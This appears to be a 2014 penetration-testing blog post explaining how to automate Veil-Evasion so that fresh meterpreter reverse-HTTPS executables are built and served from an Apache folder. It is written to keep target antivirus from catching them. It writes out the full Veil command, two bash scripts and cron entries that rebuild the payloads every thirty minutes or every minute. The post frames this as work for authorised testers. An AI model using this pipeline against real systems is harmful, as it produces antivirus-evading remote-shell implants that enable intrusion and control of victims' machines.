---
layout: post
title: Fresh Veil- Automatically Generating Payloads
category: Payloads
year: 2014
month: 2
day: 17
published: true
summary: Keep your Veil payloads fresh to avoid getting caught by signatures.
image: 
---
     
<div class="row">  
     <div class="span9 columns">

<p>Veil is awesome - it makes payload generation easy and supports a wide variety of payloads with new ones being dropped pretty often.</p>

<p>Getting caught by AV during a test is not awesome.</p>
<p>Being caught because the target’s AV had a signature hit on you is even worse. Because YOU (the tester) messed up. You didn’t take the extra few minutes to regenerate a payload. I’ve been there and I’m sure you’ve been there. It sucks and you feel silly.</p>

<p>The solution? Use Veil’s command line options and cron to regenerate payloads every 30 minutes. </p>

<br><p><b>Server Build</b></p>
<p>This is the basic build. Let’s assume that you have a server that you catch social engineering payloads on. Static IP (or domain).</p>
<p>For setup, make a directory called <code>/root/payload_temp</code> and use git to clone Veil-Evasion into that folder. Run through the setup script in Veil-Evasion/setup. </p>
<p>The <code>/root/payload_temp</code> directory is where we’ll generate the payload before we move it to our apache root.</p><br>

<p>Let’s take a look at Veil’s command line options:</p>
<img src="{{site.url}}/assets/freshveil1.png" style="height:400px"><br><br>

<p>Using these options, you can generate any payload from within Veil from the command line.</p>

<br><p>For the example code below we’ll make a <code>python/meterpreter/rev_https_contained</code> payload:</p>

<p><code>python /PATH/TO/Veil-Evasion.py -p python/meterpreter/rev_https_contained -c compile_to_exe=Y use_pyherion=Y LHOST=X.X.X.X LPORT=443 --overwrite</code></p>

<p>The <code>--overwrite</code> is necessary here to ensure that the new payloads replace the old ones. You will of course need to replace the X.X.X.X with your WAN IP or local IP if running it within a private network.</p>

<p>With the Veil command figured out, create a bash script called <code>/payload_gen.sh</code> to generate the payload and move it to the apache root:</p>

<pre><code>#!/bin/bash
cd /root/payload_temp
python /PATH/TO/Veil-Evasion.py -p python/meterpreter/rev_https_contained -c compile_to_exe=Y use_pyherion=Y LHOST=X.X.X.X LPORT=443 -o /root/payload_temp/FreshPayload --overwrite
sleep 1
mv -f /root/veil-output/compiled/payload.exe /var/www/FreshPayload.exe</code></pre>

Now we’ll add this to the cron:
<p><code>crontab -e</code> will bring up the cron settings. In the first two blank lines enter:
<pre><code>10 * * * * /payload_gen.sh
40 * * * * /payload_gen.sh</code></pre>

<p>This will make the script run twice an hour at the 10 and 40 minute marks. You can heavily customize the timing options using cron, but this is a basic implementation.

<p>That’s it. Easy, right?
<p>Good. Moving on…


<br><br><p><b>Variable IP Auto-Generation</b></p>
<p>Chances are, you’re in and out of networks that you’re testing and it’s no fun to find a possible vector that needs a binary and then have to go through the whole process of generating the payload before you can test.

<p>So <code>payload_gen2.sh</code> will pull the active eth0 IPv4 address and plug it into the same script:

<pre><code>#!/bin/bash
ADDY=$(ifconfig eth0 | awk '/inet addr/{print $2}' | awk -F':' '{print $2}')
cd /root/payload_temp
python /PATH/TO/Veil-Evasion.py -p python/meterpreter/rev_https_contained -c compile_to_exe=Y use_pyherion=Y LHOST=$ADDY LPORT=443 --overwrite
sleep 1
mv -f /root/veil-output/compiled/payload.exe /var/www/FreshPayload.exe</code></pre>

<p>For the crontab on this payload, I personally have it regenerate every minute so I never need to think about whether I got a new IP since it generated. Edit crontab using <code>crontab -e</code> and place the following code at the bottom:
<pre><code>* * * * * /payload_gen2.sh</code></pre>

<p>You could, of course, stack multiple payloads of different types (perhaps with some additional post-processing) in this script so you get a full, fresh set of all of the many payload types that Veil can generate. All ready for you in your Apache folder.




     </div>
     </div>
     <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'bluscreenofjeff';
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
<div class="row">
     <div class="span9 column">
          <p class="pull-right">{% if page.previous.url %} <a href="{{page.previous.url}}" title="Previous Post: {{page.previous.title}}"><i class="icon-chevron-left"></i></a>     {% endif %}   {% if page.next.url %}    <a href="{{page.next.url}}" title="Next Post: {{page.next.title}}"><i class="icon-chevron-right"></i></a>     {% endif %} </p>  
     </div>
</div>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-61938642-1', 'auto');
  ga('send', 'pageview');

</script>